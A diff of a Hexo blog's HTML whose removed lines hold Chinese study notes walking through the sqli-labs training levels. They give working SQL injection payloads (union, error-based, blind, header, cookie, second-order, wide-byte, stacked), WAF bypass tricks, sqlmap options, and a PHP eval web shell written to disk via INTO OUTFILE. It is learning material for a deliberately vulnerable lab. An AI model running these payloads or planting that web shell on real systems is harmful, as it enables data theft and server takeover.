@@ -14,17 +14,28 @@
 <meta name="author" content="John Doe" />
 
 
-    
-    
 
-
-<meta property="og:type" content="website">
-<meta property="og:title" content="lwb.Blog">
-<meta property="og:url" content="http://example.com/index.html">
+<meta name="description" content="信息收集： 数据库版本：version 数据库名字：database() 数据库用户：user() 操作系统：@@version_compile_os 显示数据 desc  必要知识点： 1.在MySQL5.0以上版本中，mysql存在一个自带数据库名为information_schema，他是一个存储记录有所有数据库名，表名，列名的数据库，也相当于可以通过查询它获取数据库下面的表名或列名信息 2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-labs">
+<meta property="og:url" content="http://example.com/2021/09/15/sqli-labs/index.html">
 <meta property="og:site_name" content="lwb.Blog">
+<meta property="og:description" content="信息收集： 数据库版本：version 数据库名字：database() 数据库用户：user() 操作系统：@@version_compile_os 显示数据 desc  必要知识点： 1.在MySQL5.0以上版本中，mysql存在一个自带数据库名为information_schema，他是一个存储记录有所有数据库名，表名，列名的数据库，也相当于可以通过查询它获取数据库下面的表名或列名信息 2">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="c:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20210507221739183.png">
+<meta property="og:image" content="c:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20210418164710521.png">
+<meta property="og:image" content="c:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20210418170544789.png">
+<meta property="og:image" content="c:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20210418165653031.png">
+<meta property="og:image" content="c:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20210418170450599.png">
+<meta property="og:image" content="c:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20210421211934654.png">
+<meta property="og:image" content="c:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20210421214637424.png">
+<meta property="og:image" content="c:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20210421214610257.png">
+<meta property="og:image" content="c:/Users/ASUS/Desktop/1.jpg">
+<meta property="article:published_time" content="2021-09-15T13:27:13.000Z">
+<meta property="article:modified_time" content="2021-09-15T13:28:01.504Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="c:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20210507221739183.png">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -54,13 +65,11 @@
 
 
 
-    <style> .article { opacity: 0;} </style>
-
 
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>lwb.Blog</title>
+<title>sqli-labs | lwb.Blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -69,8 +78,8 @@
     var yiliaConfig = {
         fancybox: true,
         animate: true,
-        isHome: true,
-        isPost: false,
+        isHome: false,
+        isPost: true,
         isArchive: false,
         isTag: false,
         isCategory: false,
@@ -260,9 +269,7 @@
     </div>
     <link class="menu-list" tags="Tags" friends="Friends" about="About Me"/>
 </nav>
-      <div class="body-wrap">
-  
-    <article id="post-sqli-labs" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-sqli-labs" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
       <a href="/2021/09/15/sqli-labs/" class="article-date">
@@ -280,12 +287,19 @@
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/09/15/sqli-labs/">sqli-labs</a>
+    <h1 class="article-title" itemprop="name">
+      sqli-labs
     </h1>
   
 
       </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
       
     
     <div class="article-entry" itemprop="articleBody">
@@ -502,403 +516,119 @@
       
     </div>
     
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
   </div>
   
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-sqli-labs-master" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/09/15/sqli-labs-master/" class="article-date">
-      <time datetime="2021-09-15T12:45:47.092Z" itemprop="datePublished">2021-09-15</time>
-</a>
-
-
+    
+    <div class="copyright">
+        <p><span>Title:</span><a href="/2021/09/15/sqli-labs/">sqli-labs</a></p>
+        <p><span>Author:</span><a href="/" title="Back to Homepage"></a></p>
+        <p><span>Created:</span>2021-09-15, 21:27:13</p>
+        <p><span>Updated:</span>2021-09-15, 21:28:01</p>
+        <p>
+            <span>Full URL:</span><a class="post-url" href="/2021/09/15/sqli-labs/" title="sqli-labs">http://example.com/2021/09/15/sqli-labs/</a>
+            <span class="copy-path" data-clipboard-text="From http://example.com/2021/09/15/sqli-labs/　　By " title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>License:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"CC BY-NC-SA 4.0"</a> Keep Link &amp; Author if Distribute.
+        </p>
     </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h1 id="sqli-labs-master"><a href="#sqli-labs-master" class="headerlink" title="sqli-labs-master"></a>sqli-labs-master</h1><p>信息收集：</p>
-<p>数据库版本：version</p>
-<p>数据库名字：database()</p>
-<p>数据库用户：user()</p>
-<p>操作系统：@@version_compile_os</p>
-<p>显示数据</p>
-<p>desc </p>
-<p>必要知识点：</p>
-<p>1.在MySQL5.0以上版本中，mysql存在一个自带数据库名为information_schema，他是一个存储记录有所有数据库名，表名，列名的数据库，也相当于可以通过查询它获取数据库下面的表名或列名信息</p>
-<p>2.在数据库中符号”.”代表下一级 </p>
-<p>information_schema.tables:是指information_schema库下的表tables，这个表包含所有库中的所有表的信息，且这个表在security库下</p>
-<p>information_schema.columns:是指information_schema库下的表columns，这个表包含所有库中的所有表的所有列的信息</p>
-<p>table_name  表名</p>
-<p>column_name  列名</p>
-<p>在windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符</p>
-<p>显示数据  desc 表名; </p>
-<p>高权限注入：</p>
-<p>跨站查询：两个网站A,B用得同一个数据库，我们要获取A上的信息，但是A上没有注入点，而B上有，我们可以通过B进行sql注入来获取A上的信息</p>
-<p>文件读写操作：</p>
-<p>load_file():读取函数</p>
-<p>into outfile或into dumpfile:导出函数,如何没有文件，则创建文件在写入</p>
-<p>select 要写入的内容 into outfile 文件名;</p>
-<p>路径获取常见方法：</p>
-<p>报错显示，遗留文件，漏洞报错，平台配置文件，爆破等</p>
-<p>如果源码进行了转义过滤，可以进行hex（十六进制）编码来绕过    </p>
-<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20210507221739183.png" alt="image-20210507221739183"></p>
-<p>request全部接受（_ GET,_POST）</p>
-<p>如果后台过滤了information_schema表咋办，除了information_schema外还有两个表可以查表名sys.schema_auto_increment_columns和mysql.innodb_table_stats</p>
-<p>若都过滤了再想其他方法</p>
-<p>md5绕过：</p>
-<p>ffifdyop</p>
-<p>129581926211651571912466741651878684928</p>
-<p>第五关（报错注入）：</p>
-<p><strong>布尔注入与报错注入的区别</strong></p>
-<p>报错注入会提示具体的错误信息，我们可以将我们要知道的信息在报错里弄出来</p>
-<p>1 union select count(* ),concat((查询语句),0x26,floor(rand(0)*2))x from information_schema.columns group by x;</p>
-<p>1 and     </p>
-<p>布尔盲注只会给你说这句话有错但是不会具体说是哪错了</p>
-<p><strong>第八关（布尔盲注）</strong></p>
-<p>找正确回显和错误回显页面的不同之处</p>
-<p>?id=1</p>
-<p>回显，但与前几关不一样，所以这里不能像前几关联合查询，我们得“猜”库名，表名，列名</p>
-<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20210418164710521.png" alt="image-20210418164710521"></p>
-<p>?id=1’</p>
-<p>不回显，说明是字符型</p>
-<p>可以大概猜到语句为   select * from database_name where id=’id’ …..;</p>
-<p>第一步</p>
-<p>先确定库的字数</p>
-<p>构造语句：?id=1’ and if(length(database())=1,sleep(3),1)–+</p>
-<p>可以一个一个试，这样比较浪费时间，我们这里换个快点的方式，可以用burp抓包来爆破</p>
-<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20210418170544789.png" alt="image-20210418170544789"></p>
-<p>抓下来的包是这样的，url里的构造语句被浏览器编码了，不要改，否则放包之后会报错</p>
-<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20210418165653031.png" alt="image-20210418165653031"></p>
-<p>具体作用，自己上网上找吧</p>
-<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20210418170450599.png" alt="image-20210418170450599"></p>
-<p>爆破结束之后看到有Length有两种长度，934和950从构造的语句分析可知，库名长度=8是对的</p>
-<p>库名长度出来后再用二分法一个一个“猜”每个位置的字符是什么，当然也可以用爆破</p>
-<p>第六关与第五关差不多，方法是一样的，只是一个是’  另一个是”</p>
-<p>第七关</p>
-<p><strong>导出文件注入</strong></p>
-<p>Less7.字符型 闭合方式（(‘内容 ‘)） 构造的闭合语句是 id=-1’)) 内容 #</p>
-<p>获取文件导入导出允许路径，利用@@datadir-&gt;数据库存储路径 @@basedir-&gt;mysql安装路径</p>
-<p>将写入恶意代码的内容查询结果导出到本地，菜刀连接</p>
-<p>union select 1,2,’<?php @eval($_POST["cmd"]);?>‘ into outfile “路径地址” –+</p>
-<pre><code>1
-</code></pre>
-<p>Ps：这里需要开启mysql的导入导出文件权限，在my.ini配置secure_file_priv =<br>查看文件 load_file()函数<br>写入文件 into outfile -mysql语句</p>
-<p>待补充</p>
-<p>待补充</p>
-<p>待补充</p>
-<p>第九关（时间盲注）</p>
-<p>先要确定闭合方式</p>
-<p>?id=1”(‘) sleep(3) 如何前面闭合，则语句为’1’ sleep(3)…. 如果没有语句为’1 sleep(3)’</p>
-<p>语句错不错回显都是一样的，这时我们就不能根据回显来判断了，我们可以设置时间差，比如如果语句返回的结果是true则直接返回，如果是flash则”睡一会”在返回，形成时间差来区别对错</p>
-<p>第十关与第九关差不多</p>
-<p>第十一关</p>
-<p>POST方式传参</p>
-<p>有错误信息，可以根据错误信息来判断格式  构造语句绕过?id=1’ or 1=1#</p>
-<p>POST传参我们不能在url中变化，可以用Hackbar工具来改</p>
-<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20210421211934654.png" alt="image-20210421211934654"></p>
-<p>构造语句与最前面几关一样，但要将后面的passwd参数加上</p>
-<p>第十二关与第十一关差不多，只是格式变了</p>
-<p>第十三关（二次注入）</p>
-<p>构造语句</p>
-<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20210421214637424.png" alt="image-20210421214637424"></p>
-<p>没有回显报错，但语句错误时会返回错误信息，报错注入</p>
-<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20210421214610257.png" alt="image-20210421214610257"></p>
-<p>之后语句与GET传参差不多</p>
-<p>第十四关与第十三关差不多</p>
-<p>第十五，十六关（布尔盲注）</p>
-<p>第十七关（update注入）</p>
-<p>updatexml函数：</p>
-<p>将制定的变量的只修改，返回修改后的数据，不管对错</p>
-<p>uname=admin &amp;passwd=1’ or updatexml(1,concat(0x7e,(database()),0x7e),1)#</p>
-<p>第十八关（头部注入——User-Agent）</p>
-<p>前提是你知道一个正确的账号和密码</p>
-<p>1’ or updatexml(1,concat(0x7e,(database()),0x7e),1) or ‘1’=’1</p>
-<p>“INSERT INTO <code>security</code>.<code>uagents</code> (<code>uagent</code>, <code>ip_address</code>, <code>username</code>) VALUES (‘$uagent’, ‘$IP’, $uname)”;</p>
-<p>“INSERT INTO <code>security</code>.<code>uagents</code> (<code>uagent</code>, <code>ip_address</code>, <code>username</code>) VALUES (‘’, ‘$IP’, $uname)”;</p>
-<p>导出文件注入</p>
-<p>第十九关（Referer）</p>
-<p>跟第十八关的语句一样，只是位置变了</p>
-<p>第二十关（cookie注入）</p>
-<p>观察回显</p>
-<p>如果cookie是有错误信息回显的，所以我们可以在cookie处插入语句来回显信息</p>
-<p>甚至可以发现只要cookie正确，没有密码和账号都是可以的，现实应该是不可能的</p>
-<p>方法一：联合查询union select</p>
-<p>方法二：报错信息updatexml</p>
-<p>第二十一关</p>
-<p>登录发现cookie是进过base64加密的，我们再尝试直接输入admin，发现出错但是没有错误回显，大概可以猜测这里只有输入base64加密之后的字符才能识别</p>
-<p>输入Jyk=(base64加密后)——》发现有错误回显，随意我们要先将注入语句加密后在输进去</p>
-<p>第二十二关</p>
-<p>与第二十一关差不多</p>
-<p>第二十三关</p>
-<p>过滤掉了 #，–符号</p>
-<p>方法一：使用报错语句</p>
-<p>方法二：普通注入</p>
-<p>先试一试 ?id=1’ order by 3 and ‘1’=’1     发现不管order by后面的数有多大，都回显正确</p>
-<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/2602430f8ee4">https://www.jianshu.com/p/2602430f8ee4</a>   具体看这个博客，写的详细</p>
-<p>所以我们只能用union select语句</p>
-<p>第二十四关（二次注入）</p>
-<p><strong>什么是二次注入</strong></p>
-<p>简单的说，二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。<br> 网站对我们输入的一些重要的关键字进行了转义，但是这些我们构造的语句已经写进了数据库，可以在没有被转义的地方使用<br> 可能每一次注入都不构成漏洞，但是如果一起用就可能造成注入。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">普通注入  （1）在http后面构造语句，是立即直接生效的</span><br><span class="line"></span><br><span class="line">                （2）一次注入很容易被扫描工具扫描到</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">二次注入   （1） 先构造语句（有被转义字符的语句）</span><br><span class="line"></span><br><span class="line">                （2）我们构造的恶意语句存入数据库</span><br><span class="line"></span><br><span class="line">                （3）第二次构造语句（结合前面已经存入数据库的语句，成功。因为系统没有对已经存入数据库的数据做检查）</span><br><span class="line"></span><br><span class="line">                （4）二次注入更加难以被发现</span><br></pre></td></tr></table></figure>
-
-<p><strong>二次注入的原理</strong></p>
-<p>二次注入的原理，在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身还是脏数据。</p>
-<p>在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。</p>
-<p><img src="C:\Users\ASUS\Desktop\1.jpg"></p>
-<p>例如：我们登陆时，它进行了转义，使得语句无效，我们注册个新账户：admin’#因为他被转义，而且存到了数据库的账户为admin’#</p>
-<p>,当我们用这个账户登录时，这个语句就起作用了</p>
-<p>第二十五关</p>
-<p>过滤 or 和 and</p>
-<p>order by无法使用（因为把or过滤掉了）</p>
-<p>查看源码知道，他没有使用循环来过滤or和and 所以我们可以双写来绕过 eg：oorrder by</p>
-<p>第二十五a关与第二十五关差不多</p>
-<p>第二十六关</p>
-<p>or and 空格 # –被过滤</p>
-<p>\s表示任意的空白符</p>
-<p>and or被过滤可以使用 |或&amp; 也可以双写oorr 或anandd</p>
-<p>空格绕过：</p>
-<p>1.注释绕过空格/** /,/ */       eg:union/**/select</p>
-<p>2.括号绕过空格()  eg:union(select…..)</p>
-<p>3.引号绕过空格’’    “”     eg:union’’select</p>
-<p>%0a 新建一行<br> %0c 新的一页<br> %0d return功能<br> %0b TAB键（垂直）<br> %a0 空格 </p>
-<p>这些好像只适用于linux系统下，不适用于windows系统下</p>
-<p>第二十六a关</p>
-<p>闭合方式不同，错误时没有回显信息，即盲注</p>
-<p>第二十七关</p>
-<p>过滤了union select 等等可以双写绕过，也可以大小写绕过</p>
-<p>第三十二关（宽字节绕过）</p>
-<p>#位、字节、字</p>
-<p>字节，Byte，是由八个位组成的一个单元，也就是8个bit组成1个Byte。常用于表示ASCII字符，例如字符A便用 “0100 0001”来表示。</p>
-<p>字，16个位为一个字，它代表计算机处理指令或数据的二进制数位数，是计算机进行数据存储和数据处理的运算的单位</p>
-<p>so？字=2字节=16位</p>
-<p>#宽字节</p>
-<p>宽字节其实就是两字节，GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节</p>
-<p>#宽字节绕过原理</p>
-<p>mysql在使用GBK编码的时候，会认为两个字符为一个汉字，例如%aa%5c就是一个汉字（前一个ascii码大于128才能到汉字的范围）。我们在过滤 ’ 的时候，往往利用的思路是将 ’ 转换为 \’）</p>
-<p>第三十四关（POST传参）</p>
-<p>POST传参是单字节进行编码的，不能进行宽字节注入</p>
-<p>可以抓包来绕过</p>
-<p>uname=0%df’ union select 2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273#&amp;passwd=admin</p>
-<p>第三十五关(堆叠查询注入)</p>
-<h2 id="0x00-堆叠注入定义"><a href="#0x00-堆叠注入定义" class="headerlink" title="0x00 堆叠注入定义"></a>0x00 堆叠注入定义</h2><p>   Stacked injections(堆叠注入)从名词的含义就可以看到应该是一堆 sql 语句(多条)一起执行。而在真实的运用中也是这样的, 我们知道在 mysql 中, 主要是命令行中, 每一条语句结尾加; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做 stacked injection。</p>
-<h2 id="0x01-堆叠注入原理"><a href="#0x01-堆叠注入原理" class="headerlink" title="0x01 堆叠注入原理"></a>0x01 堆叠注入原理</h2><p>   在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为： Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>
-<p>?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database();insert into users values(33,’joker’,’joker’)</p>
-<h2 id="0x02-堆叠注入的局限"><a href="#0x02-堆叠注入的局限" class="headerlink" title="0x02 堆叠注入的局限"></a>0x02 堆叠注入的局限</h2><p>虽然我们前面提到了堆叠查询可以执行任意的sql语句，但是这种注入方式并不是十分的完美的。在我们的web系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。因此，在读取数据时，我们建议使用union（联合）注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。（总的来说：堆叠注入中第二个语句主要进行增删改除，而查信息还是用union联合查询）</p>
-<p>第三十九关与上一关差不多只是闭合方式不一样</p>
-<p>第四十关</p>
-<p>半个盲注注入+堆叠查询注入</p>
-<p>第四十二关</p>
-<p>从源码中可以发现对username进行了转义，不好注入，但没有对password进行转义所以我们可以在password下手</p>
-<p>1’ or 1=1;insert into value(1,2,3);#</p>
-<p>第四十六关（order by注入）</p>
-<p>报错注入和延时注入的方式都可以</p>
-<p>也可以使用rand(true/false)判断，其实和布尔注入差不多</p>
-<p>第五十四关</p>
-<p>限制了次数，剩下的与普通注入没什么区别</p>
-<p>第五十八关</p>
-<p>查看源代码，可以发现已经限制了回显的内容，随意想要回显正确的内容就需要我们进行报错注入，当然布尔盲注也行，就是大材小用了</p>
-<h2 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h2><p>1.库信息绕过</p>
-<p>我们需要知道WAF拦截看库信息的函数时，是整体来看的，意思是过滤了database(),而不是database或者(),我们可以想办法将两个分开但不影响其功能，eg:database/**/()</p>
-<p>database()</p>
-<p>2.爬虫白名单</p>
-<p>在header中伪造信息，如果里面存在WAF关键字，就可以进行绕过</p>
-<p>3.参数污染</p>
-<p>在PHP脚本中接受参数时如果有两个一样的参数名则接受后面的参数值</p>
-<p>eg：?id=1&amp;?id=1’ union select 1,2,3#接收的就是1’ union select 1,2,3#</p>
-<p>4.有的WAF还具有工具拦截。例如：你用sqlmap测试注入时，你的头文件会显示你是通过sqlmap来访问的，就会进行拦截</p>
-<p>补充：为什么有的网站index.php/1.php（其实index.php下没有1.php）会回显index.php页面的内容，在php,ini中有一项配置cgi.fx.pathinfo,当这个配置等于1时（cgi.fx.pathinfo=1）,PHP会寻找正确的文件；例如index.php/1.php/2.php,2.php和1.php是不存在的，是PATH_INFO，但index.php是存在的，所以就会显示index.php文件的内容</p>
-<h2 id="sqlmap-sql注入工具"><a href="#sqlmap-sql注入工具" class="headerlink" title="sqlmap(sql注入工具)"></a>sqlmap(sql注入工具)</h2><p>kali自带</p>
-<p>sqlmap常用参数：<br>-u : 指定目标URL，sql注入点<br>–cookie : 当前会话的cookie值<br>-b : 获取数据库类型 检索数据库管理系统的标识<br>（DBMS：Database Management System 数据库管理系统）<br>–current-db : 获取当前数据库<br>–current-user :获取当前登录数据库使用的用户</p>
-<p>–is-dba:判断用户是否是高权限</p>
-<p>–privileges:查看权限</p>
-<p>–dbs:获取全部数据库</p>
-<p>–current-db:获取当前网站的数据库</p>
-<p>sql注入做题步骤</p>
-<p>先确定是什么类型（字符型，数字型）——》再确定闭合方式——》再确定传送的形式是GET或者是POST——》再确定是什么类型的注入（普通/报错注入/盲注/返回头注入/宽字节注入/waf）</p>
-<p>缺点：不支持mongodb数据库</p>
-<h2 id="各种数据库的结构"><a href="#各种数据库的结构" class="headerlink" title="各种数据库的结构"></a>各种数据库的结构</h2><p><strong>Access:</strong></p>
-<p>​    表名</p>
-<p>​                列名</p>
-<p>​                            数据</p>
-<p>Access数据库只有一个库（省去了查库的步骤），且数据就在源码目录里，与mysql相比，缺少一些函数，使得在mysql中的功能在Access中用不了，eg：文件读写</p>
-<p>Access中没有information_schema，所以要想得到表名只能猜或者用工具破解</p>
-<p><strong>SqlServer</strong></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
 
 
 
-
-
-
-
-
-
-  
-    <article id="post-my-first-blog" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/09/14/my-first-blog/" class="article-date">
-      <time datetime="2021-09-14T08:41:43.000Z" itemprop="datePublished">2021-09-14</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
+    <nav id="article-nav">
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/09/14/my-first-blog/">my first blog</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
         
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2021/09/15/sqli-labs-master/">
+                    
+                </a>
+            </div>
+        
+    </nav>
 
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
   
 </article>
 
-
-
-
-
-
-
-
-
-  
-    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/09/14/hello-world/" class="article-date">
-      <time datetime="2021-09-14T08:36:11.951Z" itemprop="datePublished">2021-09-14</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">Contents</strong>
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/09/14/hello-world/">Hello World</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-      
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E5%AE%9A%E4%B9%89"><span class="toc-number">1.</span> <span class="toc-text">0x00 堆叠注入定义</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">0x01 堆叠注入原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E7%9A%84%E5%B1%80%E9%99%90"><span class="toc-number">3.</span> <span class="toc-text">0x02 堆叠注入的局限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WAF%E7%BB%95%E8%BF%87"><span class="toc-number">4.</span> <span class="toc-text">WAF绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlmap-sql%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7"><span class="toc-number">5.</span> <span class="toc-text">sqlmap(sql注入工具)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E7%BB%93%E6%9E%84"><span class="toc-number">6.</span> <span class="toc-text">各种数据库的结构</span></a></li></ol>
+        
     </div>
-    
-    <div class="article-info article-info-index">
-      
-      
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
 
-      
-      
-      <div class="clearfix"></div>
+    <input type="button" id="tocButton" value="Hide"  title="Show or Hide Table of Contents">
+
+    <script>
+        yiliaConfig.toc = ["Hide", "Show", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"sqli-labs　| lwb.Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
